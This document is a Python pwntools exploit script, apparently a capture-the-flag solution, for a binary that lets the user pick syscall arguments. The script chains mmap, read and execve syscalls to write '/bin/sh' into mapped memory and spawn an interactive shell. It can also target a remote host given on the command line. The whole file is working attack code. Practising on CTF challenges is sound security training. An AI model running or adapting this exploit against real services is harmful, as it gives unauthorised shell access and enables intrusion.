#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('challenge')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+261
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def syscall(rdi, rsi, rdx, r10, r8, r9, sysno):
    io.sendlineafter(b"rdi?", str(rdi).encode())
    io.sendlineafter(b"rsi?", str(rsi).encode())
    io.sendlineafter(b"rdx?", str(rdx).encode())
    io.sendlineafter(b"r10?", str(r10).encode())
    io.sendlineafter(b"r8?", str(r8).encode())
    io.sendlineafter(b"r9?", str(r9).encode())
    io.sendlineafter(b"call?", str(sysno).encode())


def solve():

    addr = 0x400000
    """
    mmap(), read(), execve()
    """
    syscall(addr, 0x100, 3, 0x21, 0, 0, 0x9)
    io.sendline(b"1")
    syscall(0, addr, 0x10, 0, 0, 0, 0)
    io.sendline(b"/bin/sh\x00")
    io.sendline(b"1")
    syscall(addr, 0, 0, 0, 0, 0, 0x3b)
    io.clean()
    
    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

